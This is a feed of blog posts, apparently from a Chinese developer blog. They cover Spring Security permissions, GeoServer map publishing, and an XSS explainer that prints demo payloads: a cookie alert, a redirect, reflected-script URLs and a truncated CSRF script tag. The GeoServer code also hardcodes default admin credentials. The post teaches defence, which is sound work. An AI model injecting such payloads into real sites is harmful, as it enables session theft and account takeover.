23 24 25 26 27 28 29 30 31 32 33 34 /** * 获取菜单数据权限 * * @param user 用户信息 * @return 菜单权限信息 */ public Set\u0026lt;String\u0026gt; getMenuPermission(SysUser user) { Set\u0026lt;String\u0026gt; perms = new HashSet\u0026lt;String\u0026gt;(); // 管理员拥有所有权限 if (user.isAdmin()) { perms.add(\u0026#34;*:*:*\u0026#34;); } else { List\u0026lt;SysRole\u0026gt; roles = user.getRoles(); if (!roles.isEmpty() \u0026amp;\u0026amp; roles.size() \u0026gt; 1) { // 多角色设置permissions属性，以便数据权限匹配权限 for (SysRole role : roles) { Set\u0026lt;String\u0026gt; rolePerms = menuService.selectMenuPermsByRoleId(role.getRoleId()); role.setPermissions(rolePerms); perms.addAll(rolePerms); } } else { perms.addAll(menuService.selectMenuPermsByUserId(user.getUserId())); } } return perms; } Mapper\n1 2 3 4 5 6 7 8 \u0026lt;select id=\u0026#34;selectMenuPermsByUserId\u0026#34; parameterType=\u0026#34;Long\u0026#34; resultType=\u0026#34;String\u0026#34;\u0026gt; select distinct m.perms from sys_menu m left join sys_role_menu rm on m.menu_id = rm.menu_id left join sys_user_role ur on rm.role_id = ur.role_id left join sys_role r on r.role_id = ur.role_id where m.status = \u0026#39;0\u0026#39; and r.status = \u0026#39;0\u0026#39; and ur.user_id = #{userId} \u0026lt;/select\u0026gt; 3.2 @PreAuthorize SpringSecurity为我们提供了基于注解的权限控制方案，这也是我们项目中主要采用的方式。我们可以使用注解去指定访问对应的资源所需的权限。\n但是要使用它我们需要先开启相关配置。\n1 @EnableGlobalMethodSecurity(prePostEnabled = true) 然后就可以使用对应的注解：@PreAuthorize\nSpringBoot - @PreAuthorize注解详解\n3.3 自定义权限 3.2.1 注解如何使用？ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /** * 状态修改 */ @PreAuthorize(\u0026#34;@ss.hasPermi(\u0026#39;system:user:edit\u0026#39;)\u0026#34;) @Log(title = \u0026#34;用户管理\u0026#34;, businessType = BusinessType.UPDATE) @PutMapping(\u0026#34;/status\u0026#34;) public ApiResponse changeStatus(@RequestBody SysUser user) { userService.checkUserAllowed(user); SysUser sysUser = new SysUser(); sysUser.setUserId(user.getUserId()); sysUser.setStatus(user.getStatus()); user.setUpdateBy(getUsername()); return affectRows(userService.updateUserStatus(user)); } 3.2.2 自定义权限实现 @PreAuthorize(\u0026quot;@ss.hasPermi('system:user:edit')\u0026quot;)的意思是什么？\nA. ss 是一个注册在 Spring容器中的Bean；\nB. hasPermi 是PermissionService类中定义的方法；\nC.当Spring EL 表达式返回True，则权限校验通过；\n在hasPermi方法中，获取当前用户权限loginUser.getPermissions()，与传入的permission作比较，看传入的permission是否在loginUser的permissions集合中\nPermissionService.java的定义如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 @Service(\u0026#34;ss\u0026#34;) public class PermissionService{ /** 所有权限标识 */ private static final String ALL_PERMISSION = \u0026#34;*:*:*\u0026#34;; /** 管理员角色权限标识 */ private static final String SUPER_ADMIN = \u0026#34;admin\u0026#34;; private static final String ROLE_DELIMETER = \u0026#34;,\u0026#34;; private static final String PERMISSION_DELIMETER = \u0026#34;,\u0026#34;; /** * 验证用户是否具备某权限 * * @param permission 权限字符串 * @return 用户是否具备某权限 */ public boolean hasPermi(String permission) { if (StringUtils.isEmpty(permission)) { return false; } LoginUser loginUser = SecurityUtils.getLoginUser(); if (StringUtils.isNull(loginUser) || CollectionUtils.isEmpty(loginUser.getPermissions())) { return false; } PermissionContextHolder.setContext(permission); return hasPermissions(loginUser.getPermissions(), permission); } } 3.2.3 如何使用原生的权限？ 3.4 前端权限校验 3.4.1 自定义指令-Directives 使用vue的自定义指令-Directives实现前端根据权限决定是否渲染操作组件\n创建操作权限Directive以及角色权限Directive\n根据用户拥有的permissions以及roles决定是否渲染被相应自定义组件标注的操作组件\nsrc/directive/permission/index.ts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 import type { Directive, DirectiveBinding } from \u0026#34;vue\u0026#34;; import useUserStore from \u0026#34;@/stores/modules/user\u0026#34;; /** * 操作权限处理 */ export const hasPermi: Directive = { mounted(el: HTMLElement, binding: DirectiveBinding) { const { value } = binding; const all_permission = \u0026#34;*:*:*\u0026#34;; const store = useUserStore(); const permissions = store.permissions; if (value \u0026amp;\u0026amp; value instanceof Array \u0026amp;\u0026amp; value.length \u0026gt; 0) { const permissionFlag = value; const hasPermissions = permissions.some((permission: string) =\u0026gt; { return all_permission === permission || permissionFlag.includes(permission); }); if (!hasPermissions) { el.parentNode \u0026amp;\u0026amp; el.parentNode.removeChild(el); } } else { throw new Error(`请设置操作权限标签值`); } } }; /** * 角色权限处理 */ export const hasRole: Directive = { mounted(el: HTMLElement, binding: DirectiveBinding) { const { value } = binding; const super_admin = \u0026#34;admin\u0026#34;; const store = useUserStore(); const roles = store.roles; if (value \u0026amp;\u0026amp; value instanceof Array \u0026amp;\u0026amp; value.length \u0026gt; 0) { const roleFlag = value; const hasRole = roles.some((role: string) =\u0026gt; { return super_admin === role || roleFlag.includes(role); }); if (!hasRole) { el.parentNode \u0026amp;\u0026amp; el.parentNode.removeChild(el); } } else { throw new Error(`请设置角色权限标签值\u0026#34;`); } } }; 3.4.2 全局注册自定义指令 src/directive/index.ts\n1 2 3 4 5 6 7 8 import { hasRole, hasPermi } from \u0026#34;./permission\u0026#34;; import type { App } from \u0026#34;@vue/runtime-core\u0026#34;; export default function directive(app: App) { app.directive(\u0026#34;hasRole\u0026#34;, hasRole); app.directive(\u0026#34;hasPermi\u0026#34;, hasPermi); } main.ts\n1 2 3 const app = createApp(App); import directive from \u0026#34;./directive\u0026#34;; // directive directive(app); 3.4.3 使用自定义指令 例如 v-hasPermi=\u0026quot;['system:role:add']\u0026quot;\n会根据当前用户是否具有 'system:role:add' 操作权限来决定是否渲染button\n1 2 3 4 5 6 7 8 \u0026lt;el-button type=\u0026#34;primary\u0026#34; plain icon=\u0026#34;Plus\u0026#34; style=\u0026#34;margin-right: 30px\u0026#34; @click=\u0026#34;handleAdd\u0026#34; v-hasPermi=\u0026#34;[\u0026#39;system:role:add\u0026#39;]\u0026#34; \u0026gt;新增角色\u0026lt;/el-button\u0026gt; ","permalink":"https://chance7bin.github.io/posts/design/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97%E5%AE%9E%E7%8E%B0/","summary":"0 引言 该篇文章是对Spring Security学习的总结，以及系统中认证授权的代码实现 参考链接 SpringSecurity-从入门到精通 1 Spring","title":"权限管理模块实现"},{"content":"1. 引入geoserver依赖 1 2 3 4 5 6 \u0026lt;!--geoserver依赖--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;nl.pdok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;geoserver-manager\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.7.0-pdok2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2. 流程 （1）创建geoserver连接对象\n（2）创建工作区，有则不创建\n（3）创建数据源和发布图层服务\n（4）mapbox加载WMS服务\n3. Java代码 3.1 geoserver创建连接信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 String url = \u0026#34;http://172.21.212.240:8008/geoserver\u0026#34;; //geoserver的地址 String un = \u0026#34;admin\u0026#34;; //geoserver的账号 String pw = \u0026#34;geoserver\u0026#34;; //geoserver的密码 String workspace = \u0026#34;shapefile\u0026#34;; //工作区名称 String storename = \u0026#34;test\u0026#34;; //数据源名称 String layername = \u0026#34;bus_point\u0026#34;; //发布的图层名称，此名称必须和压缩包的名称一致 //shp文件压缩包，必须是zip压缩包，且shp文件(.shp、.dbf、.shx等)外层不能有文件夹，且压缩包名称需要与shp图层名称一致 String zipFilePath = \u0026#34;E:\\\\GIS_Data\\\\chengdu\\\\bus_point.zip\u0026#34;; // 1、获取geoserver连接对象 GeoServerRESTManager manager = null; try { manager = new GeoServerRESTManager(new URL(url) , un , pw); System.out.println(\u0026#34;连接geoserver服务器成功\u0026#34;); }catch (Exception e){ e.printStackTrace(); System.out.println(\u0026#34;geoserver服务器连接失败\u0026#34;); return; } 3.2 manager中重要的几个类对象 geoserver-manager中几个重要的类对象\n1.GeoServerRESTManager该对象是一个最大的管理者可以获取以下两个对象，创建数据存储\n2.GeoServerRESTPublisher，发布对象，用来发布各种数据和创建工作空间（主要用来创建对象）\n3.GeoServerRESTReader，获取数据存储、图层、样式、图层组等（主要用来获取信息）\n1 2 3 GeoServerRESTReader reader = manager.getReader(); GeoServerRESTPublisher publisher = manager.getPublisher(); GeoServerRESTStoreManager storeManager = manager.getStoreManager(); 3.3 创建工作区 1 2 3 4 5 6 7 8 9 // 2、判断是否有工作区，没有则创建 boolean b2 = reader.existsWorkspace(workspace); if(!b2){ boolean b = publisher.createWorkspace(workspace); if(!b){ System.out.println(\u0026#34;工作区创建失败\u0026#34;); return; } } 3.4 添加style样式 1 2 3 4 5 6 7 8 9 10 // style样式 String styleName = \u0026#34;styletest\u0026#34;; String styleSld; // 判断是否已经发布了style if (!reader.existsStyle(workspace, styleName)) { String styleFilePath = \u0026#34;Z:\\\\GIStone\\\\SuperMap\\\\Server\\\\webapps\\\\iserver\\\\WEB-INF\\\\config\\\\region.sld\u0026#34;; File styleFile = new File(styleFilePath); publisher.publishStyleInWorkspace(workspace, styleFile, styleName); } styleSld = reader.getSLD(workspace, styleName); style样式引入的sld文件。SLD是风格化图层描述器（Styled Layer Descriptor）的简称。SLD描述了如何在WMS规范的基础上进行扩展使之支持用户对要素数据进行自定义的符号化显示。SLD是一种基于XML语言的OGC标准。这表示SLD文件会被GeoServer创建并且能够被任何一种支持WMS的服务器软件所支持。我们不想限制大家渲染地图的方式，因此我们使用OGC标准规定的SLD作为GeoServer的渲染系统的核心。\n3.5 创建数据源 3.6 发布图层服务 创建数据源 和 发布图层服务可以一步进行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 3、判断是否有数据源，没有则创建 // 4、发布图层，如果存在就不发布 // 创建数据源 和 发布图层服务可以一步进行 RESTDataStore datastore = reader.getDatastore(workspace, storename); RESTLayer layer = reader.getLayer(workspace, layername); if(layer == null \u0026amp;\u0026amp; datastore == null){ File file = new File(zipFilePath); // 进行发布；参数依次为：工作区名称、数据源名称、图层名称、shp文件压缩文件对象、坐标系 boolean b = false; try { b = publisher.publishShp(workspace , storename , layername , file , GeoServerRESTPublisher.DEFAULT_CRS); } catch (FileNotFoundException e) { e.printStackTrace(); } if(!b){ System.out.println(\u0026#34;shp图层发布失败\u0026#34;); } else { System.out.println(\u0026#34;shp图层发布成功\u0026#34;); } } 3.7 发布完成 3.8 注意事项 layer图层的名称一定要与shp文件的名称一样。\n如果需要用到压缩文件，压缩文件只能为zip格式，不能是rar格式否则会报错，而且压缩文件的路径是全路径。\n参考链接\nJava将shp文件发布为geoserver服务\nJava实现GeoServer通过rest发布shp至WMS服务\n4. mapbox加载WMS WMS服务地址：\nworkspace：geoserver工作空间\nlayername：图层名称（与zip包以及其中的shp文件名称一直）\n1 \u0026#34;http://localhost:8008/geoserver/\u0026#34; + workspace + \u0026#34;/wms?service=WMS\u0026amp;version=1.1.0\u0026amp;request=GetMap\u0026amp;layers=\u0026#34; + workspace + \u0026#34;:\u0026#34; + layername + \u0026#34;\u0026amp;styles=\u0026amp;bbox={bbox-epsg-3857}\u0026amp;width=256\u0026amp;height=256\u0026amp;srs=EPSG:3857\u0026amp;format=image/png\u0026amp;TRANSPARENT=TRUE\u0026#34;; html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;MapBox加载WMS地图服务\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#39;https://api.mapbox.com/mapbox-gl-js/v0.50.0/mapbox-gl.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#39;https://api.mapbox.com/mapbox-gl-js/v0.50.0/mapbox-gl.css\u0026#39; rel=\u0026#39;stylesheet\u0026#39; /\u0026gt; \u0026lt;style\u0026gt; body { margin:0; padding:0; } #map { position:absolute; top:0; bottom:0; width:100%; } /*隐藏logo*/ .mapboxgl-ctrl.mapboxgl-ctrl-attrib{ display: none !important; } .mapboxgl-ctrl-logo{ display: none !important; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#39;map\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script \u0026gt; mapboxgl.accessToken = \u0026#39;pk.eyJ1Ijoid3lqcSIsImEiOiJjbDBnZDdwajUxMXR...BIZtZg\u0026#39;; var map = new mapboxgl.Map({ container: \u0026#39;map\u0026#39;, style: \u0026#39;mapbox://styles/mapbox/streets-v10\u0026#39;, center: [108.438,34.431], zoom: 7 }); map.on(\u0026#34;load\u0026#34;,function () { map.addLayer({ \u0026#39;id\u0026#39;: \u0026#39;wms-test-layer\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;raster\u0026#39;, \u0026#39;source\u0026#39;: { \u0026#39;type\u0026#39;: \u0026#39;raster\u0026#39;, \u0026#39;tiles\u0026#39;: [ // \u0026#34;http://127.0.0.1:8008/geoserver/shapefile/wms?service=WMS\u0026amp;version=1.1.0\u0026amp;request=GetMap\u0026amp;layers=shapefile:bus_point\u0026amp;tiled=true\u0026amp;srsname=EPSG:4326\u0026#34; \u0026#39;http://localhost:8008/geoserver/shapefile/wms?service=WMS\u0026amp;version=1.1.0\u0026amp;request=GetMap\u0026amp;layers=shapefile:bus_point\u0026amp;styles=\u0026amp;bbox={bbox-epsg-3857}\u0026amp;width=256\u0026amp;height=256\u0026amp;srs=EPSG:3857\u0026amp;format=image/png\u0026amp;TRANSPARENT=TRUE\u0026#39; ], \u0026#39;tileSize\u0026#39;: 256 }, \u0026#39;paint\u0026#39;: {} }); }) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 效果预览\n参考链接\nMapBox加载GeoServer发布的WMS地图服务\nMapbox GL 加载GeoServer发布的WMS地图服务及点击查询\nopenLayers 坐标转换 EPSG:3857和EPSG:4326区别\n","permalink":"https://chance7bin.github.io/posts/map/java%E4%BD%BF%E7%94%A8geoserver%E5%8F%91%E5%B8%83%E5%9C%B0%E5%9B%BE%E6%9C%8D%E5%8A%A1/","summary":"1. 引入geoserver依赖 1 2 3 4 5 6 \u0026lt;!--geoserver依赖--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;nl.pdok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;geoserver-manager\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.7.0-pdok2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2. 流程 （1）创建geoserver连接对象","title":"Java使用Geoserver发布地图服务"},{"content":" XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。\nXSS 简介 举一个简单的例子，就是留言板。我们知道留言板通常的任务就是把用户留言的内容展示出来。正常情况下，用户的留言都是正常的语言文字，留言板显示的内容也就没毛病。然而这个时候如果有人不按套路出牌，在留言内容中丢进去一行\n1 \u0026lt;script\u0026gt;alert(\u0026#34;aaa\u0026#34;)\u0026lt;/script\u0026gt; 那么留言板界面的网页代码就会变成形如以下：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Board\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;board\u0026#34;\u0026gt; \u0026lt;script\u0026gt;alert(\u0026#34;aaa\u0026#34;)\u0026lt;/script\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 那么这个时候问题就来了，当浏览器解析到用户输入的代码那一行时会发生什么呢？答案很显然，浏览器并不知道这些代码改变了原本程序的意图，会照做弹出一个信息框。\n既然能够执行脚本，那么，这些脚本完全可以是：\n链接劫持 1 \u0026lt;script\u0026gt;window.location.href=\u0026#34;http://www.baidu.com\u0026#34;;\u0026lt;/script\u0026gt; 盗取cookie 1 \u0026lt;script\u0026gt;alert(\u0026#34;document.cookie\u0026#34;);\u0026lt;/script\u0026gt; 对于攻击者来说，能够让受害者浏览器执行恶意代码的唯一方式，就是把代码注入到受害者从网站下载的网页中, 这就是xss攻击。\nXSS 攻击类型 通常XSS攻击分为：反射型xss攻击, 存储型xss攻击 和 DOM型xss攻击。同时注意以下例子只是简单的向你解释这三种类型的攻击方式而已，实际情况比这个复杂，具体可以再结合最后一节深入理解。\n反射型xss攻击 反射型的攻击需要用户主动的去访问带攻击的链接，攻击者可以通过邮件或者短信的形式，诱导受害者点开链接。如果攻击者配合短链接URL，攻击成功的概率会更高。\n在一个反射型XSS攻击中，恶意文本属于受害者发送给网站的请求中的一部分。随后网站又把恶意文本包含进用于响应用户的返回页面中，发还给用户。\n1、用户误点开了带攻击的url : http://xxx?name=\u0026lt;script\u0026gt;alert('aaa')\u0026lt;/script\u0026gt;\n2、网站给受害者的返回中正常的网页\n3、用户的浏览器收到文本后执行页面合法脚本，这时候页面恶意脚本会被执行，会在网页中弹窗aaa\n这种攻击方式发生在我们合法的js执行中，服务器无法检测我们的请求是否有攻击的危险\n存储型xss攻击 这种攻击方式恶意代码会被存储在数据库中，其他用户在正常访问的情况下，也有会被攻击，影响的范围比较大。\n1、攻击者通过评论表单提交将\u0026lt;script\u0026gt;alert(‘aaa’)\u0026lt;/script\u0026gt;提交到网站\n2、网站后端对提交的评论数据不做任何操作，直接存储到数据库中\n3、其他用户访问正常访问网站，并且需要请求网站的评论数据\n4、网站后端会从数据库中取出数据，直接返回给用户\n5、用户得到页面后，直接运行攻击者提交的代码\u0026lt;script\u0026gt;alert(‘aaa’)\u0026lt;/script\u0026gt;，所有用户都会在网页中弹出aaa的弹窗\nDOM型xss攻击 基于DOM的XSS攻击是反射型攻击的变种。服务器返回的页面是正常的，只是我们在页面执行js的过程中，会把攻击代码植入到页面中。\n1、用户误点开了带攻击的url : http://xxx?name=\u0026lt;script\u0026gt;alert('aaa')\u0026lt;/script\u0026gt;\n2、网站给受害者的返回中正常的网页\n3、用户的浏览器收到文本后执行页面合法脚本，这时候页面恶意脚本会被执行，会在网页中弹窗aaa\n这种攻击方式发生在我们合法的js执行中，服务器无法检测我们的请求是否有攻击的危险\nXSS 攻击的危害 通过document.cookie盗取cookie 使用js或css破坏页面正常的结构与样式 流量劫持（通过访问某段具有window.location.href定位到其他页面） Dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。 利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。 利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。 DOS（拒绝服务）客户端浏览器。 钓鱼攻击，高级的钓鱼技巧。 劫持用户Web行为，甚至进一步渗透内网。 蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据 通过xss盗用cookie危害是什么？ csrf攻击其实是不能盗用cookie的，它只是以当前的名义进行恶意操作；而xss攻击是可以直接盗用cookie。\n那盗用cookie的危害是什么？比如拿到用户的cookie信息，然后传送到攻击者自己的服务器，从cookie中提取敏感信息，拿到用户的登录信息，或者攻击者可以通过修改DOM在页面上插入一个假的登陆框，也可以把表单的action属性指向他自己的服务器地址，然后欺骗用户提交自己的敏感信息。\n这就是为什么cookie也是要防御的\nXSS 攻击的防御 XSS攻击其实就是代码的注入。用户的输入被编译成恶意的程序代码。所以，为了防范这一类代码的注入，需要确保用户输入的安全性。对于攻击验证，我们可以采用以下两种措施：\n编码，就是转义用户的输入，把用户的输入解读为数据而不是代码 校验，对用户的输入及请求都进行过滤检查，如对特殊字符进行过滤，设置输入域的匹配规则等。 具体比如：\n对于验证输入，我们既可以在服务端验证，也可以在客户端验证 对于持久性和反射型攻击，服务端验证是必须的，服务端支持的任何语言都能够做到 对于基于DOM的XSS攻击，验证输入在客户端必须执行，因为从服务端来说，所有发出的页面内容是正常的，只是在客户端js代码执行的过程中才发生可攻击 但是对于各种攻击方式，我们最好做到客户端和服务端都进行处理。 其它还有一些辅助措施，比如：\n入参长度限制： 通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。 设置cookie http-only为true 验证输入 自定义@Xss注解，将定义的Xss注解放在字段或者方法的上方\n@Xss注解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /** * 自定义xss校验注解 * * @author 7bin */ @Retention(RetentionPolicy.RUNTIME) @Target(value = { ElementType.METHOD, ElementType.FIELD, ElementType.CONSTRUCTOR, ElementType.PARAMETER }) @Constraint(validatedBy = { XssValidator.class }) public @interface Xss { String message() default \u0026#34;不允许任何脚本运行\u0026#34;; Class\u0026lt;?\u0026gt;[] groups() default {}; Class\u0026lt;? extends Payload\u0026gt;[] payload() default {}; } 自定义校验器XssValidator\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /** * 自定义xss校验注解实现 * * @author 7bin */ public class XssValidator implements ConstraintValidator\u0026lt;Xss, String\u0026gt; { private static final String HTML_PATTERN = \u0026#34;\u0026lt;(\\\\S*?)[^\u0026gt;]*\u0026gt;.*?|\u0026lt;.*? /\u0026gt;\u0026#34;; @Override public boolean isValid(String value, ConstraintValidatorContext constraintValidatorContext) { if (StringUtils.isBlank(value)) { return true; } return !containsHtml(value); } public static boolean containsHtml(String value) { Pattern pattern = Pattern.compile(HTML_PATTERN); Matcher matcher = pattern.matcher(value); return matcher.matches(); } } 使用自定义Xss注解\n实体类\n1 2 3 4 5 6 7 8 9 10 public class SysUser extends BaseEntity { .... @Xss(message = \u0026#34;用户账号不能包含脚本字符\u0026#34;) @NotBlank(message = \u0026#34;用户账号不能为空\u0026#34;) @Size(min = 0, max = 30, message = \u0026#34;用户账号长度不能超过30个字符\u0026#34;) public String getUserName() { return userName; } } Controller\n在Controller的方法上，给参数SysUser类加上@Validated来修饰，这样校验就可以生效了\n1 2 3 4 5 @PutMapping public ApiResponse edit(@Validated @RequestBody SysUser user) { ... } escapeHTML 在服务端添加XSS的Filter，用于正确处理转义字符，产生正确的Java、JavaScript、HTML、XML和SQL代码\nFilterConfig：注册XSS过滤器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 @Configuration public class FilterConfig { @Value(\u0026#34;${xss.excludes}\u0026#34;) private String excludes; @Value(\u0026#34;${xss.urlPatterns}\u0026#34;) private String urlPatterns; @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34; }) @Bean @ConditionalOnProperty(value = \u0026#34;xss.enabled\u0026#34;, havingValue = \u0026#34;true\u0026#34;) public FilterRegistrationBean xssFilterRegistration() { FilterRegistrationBean registration = new FilterRegistrationBean(); registration.setDispatcherTypes(DispatcherType.REQUEST); registration.setFilter(new XssFilter()); registration.addUrlPatterns(StringUtils.split(urlPatterns, \u0026#34;,\u0026#34;)); registration.setName(\u0026#34;xssFilter\u0026#34;); registration.setOrder(FilterRegistrationBean.HIGHEST_PRECEDENCE); Map\u0026lt;String, String\u0026gt; initParameters = new HashMap\u0026lt;String, String\u0026gt;(); initParameters.put(\u0026#34;excludes\u0026#34;, excludes); registration.setInitParameters(initParameters); return registration; } } XssFilter：使用自定义XssHttpServletRequestWrapper替换默认的request\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 /** * 防止XSS攻击的过滤器 * * @author 7bin */ public class XssFilter implements Filter { /** * 排除链接 */ public List\u0026lt;String\u0026gt; excludes = new ArrayList\u0026lt;\u0026gt;(); @Override public void init(FilterConfig filterConfig) throws ServletException { String tempExcludes = filterConfig.getInitParameter(\u0026#34;excludes\u0026#34;); if (StringUtils.isNotEmpty(tempExcludes)) { String[] url = tempExcludes.split(\u0026#34;,\u0026#34;); for (int i = 0; url != null \u0026amp;\u0026amp; i \u0026lt; url.length; i++) { excludes.add(url[i]); } } } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { HttpServletRequest req = (HttpServletRequest) request; HttpServletResponse resp = (HttpServletResponse) response; if (handleExcludeURL(req, resp)) { chain.doFilter(request, response); return; } XssHttpServletRequestWrapper xssRequest = new XssHttpServletRequestWrapper((HttpServletRequest) request); chain.doFilter(xssRequest, response); } private boolean handleExcludeURL(HttpServletRequest request, HttpServletResponse response) { String url = request.getServletPath(); String method = request.getMethod(); // GET DELETE 不过滤 if (method == null || HttpMethod.GET.matches(method) || HttpMethod.DELETE.matches(method)) { return true; } return StringUtils.matches(url, excludes); } @Override public void destroy() { } } XssHttpServletRequestWrapper\nxss过滤（清除所有HTML标签，但是不删除标签内的内容）：json = EscapeUtil.clean(json).trim();\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 /** * XSS过滤处理 * * @author 7bin */ public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper { /** * @param request */ public XssHttpServletRequestWrapper(HttpServletRequest request) { super(request); } @Override public String[] getParameterValues(String name) { String[] values = super.getParameterValues(name); if (values != null) { int length = values.length; String[] escapesValues = new String[length]; for (int i = 0; i \u0026lt; length; i++) { // 防xss攻击和过滤前后空格 escapesValues[i] = EscapeUtil.clean(values[i]).trim(); } return escapesValues; } return super.getParameterValues(name); } @Override public ServletInputStream getInputStream() throws IOException { // 非json类型，直接返回 if (!isJsonRequest()) { return super.getInputStream(); } // 为空，直接返回 String json = IOUtils.toString(super.getInputStream(), \u0026#34;utf-8\u0026#34;); if (StringUtils.isEmpty(json)) { return super.getInputStream(); } // xss过滤 json = EscapeUtil.clean(json).trim(); byte[] jsonBytes = json.getBytes(\u0026#34;utf-8\u0026#34;); final ByteArrayInputStream bis = new ByteArrayInputStream(jsonBytes); return new ServletInputStream() { @Override public boolean isFinished() { return true; } @Override public boolean isReady() { return true; } @Override public int available() throws IOException { return jsonBytes.length; } @Override public void setReadListener(ReadListener readListener) { } @Override public int read() throws IOException { return bis.read(); } }; } /** * 是否是Json请求 * */ public boolean isJsonRequest() { String header = super.getHeader(HttpHeaders.CONTENT_TYPE); return StringUtils.startsWithIgnoreCase(header, MediaType.APPLICATION_JSON_VALUE); } } http-only 如果某一个Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，JS 是操作不了的，对于 document.cookie 来说是透明的。\nhttp-only 的应用场景是防止 XSS 攻击。\n举例：\n例如我在评论区写了一段 hack JS，服务端因存在 XSS 漏洞，没有对 \u0026lt; 进行转义。导致这段 JS 在其他人打开此页面的时候也被执行了。\n如果我上面的 hack JS 中写了获取所有 cookie，并发送到我的服务器上，这样用户的登录信息就泄漏了。\n如果 cookie 开启了 http-only 之后，我的hack js 无法获取到用户的 cookie，它们的登录信息就无法泄漏了。\n以 Google 翻译为例子，初次打开时，Cookie里面是这样的一共有4条记录，注意第二个最右侧倒数第三个字段有一个√， 这个对勾表明这条记录是 HttpOnly = true 的，对于Js，你是拿不到的。\n服务端设置Cookie\n1 2 3 4 5 6 7 8 9 10 @RequestMapping(\u0026#34;/login\u0026#34;) @ResponseBody public void login(HttpServletRequest request, HttpServletResponse response) throws IOException { Cookie cookie = new Cookie(\u0026#34;access_token\u0026#34;, UUID.randomUUID().toString()); cookie.setHttpOnly(true); // 这里 cookie.setPath(\u0026#34;/\u0026#34;); cookie.setDomain(\u0026#34;localhost\u0026#34;); response.addCookie(cookie); response.sendRedirect(\u0026#34;http://localhost:8088/index.html\u0026#34;); } xss攻击和csrf攻击配合 一般攻击可能不是单一的行为，而是可能会组合攻击；比如xss攻击一般还可以配合csrf攻击进行配合攻击，这里给个例子，方便你理解；注意，只是仅仅方便你理解，实际不是这么简单。\n假设你可以通过如下GET请求方式进行修改密码，这是典型的csrf攻击方式：开发安全 - CSRF 详解\n1 2 http://127.0.0.1/test/vulnerabilities/csrf/? password_new=123456\u0026amp;password_conf=123456\u0026amp;Change=Change 那么你可以通过如下方式xss攻击添加脚本\n1 2 \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;http://127.0.0.1/test/vulnerabilities/csrf/? 